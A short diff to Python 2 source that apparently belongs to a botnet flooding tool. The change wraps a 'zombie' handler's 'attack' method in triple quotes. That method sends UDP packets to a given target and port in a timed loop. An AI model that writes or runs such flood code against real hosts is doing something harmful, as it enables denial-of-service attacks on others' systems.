@@ -19,6 +19,7 @@ class zombie(SocketServer.BaseRequestHandler):
 
         print "ended attack"
 
+    """
     def attack(self, timeout, target, port):
         print "start attack: ", timeout, " ", target, " ", port
         victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -28,6 +29,7 @@ class zombie(SocketServer.BaseRequestHandler):
         while time.clock() - start < timeout:
             #port = random.randint(1, 65535)
             victim.sendto(MESSAGE, (target, port))
+    """
 
 class attackModule(threading.Thread):
     def __init__(self, timeout, target, port, num):
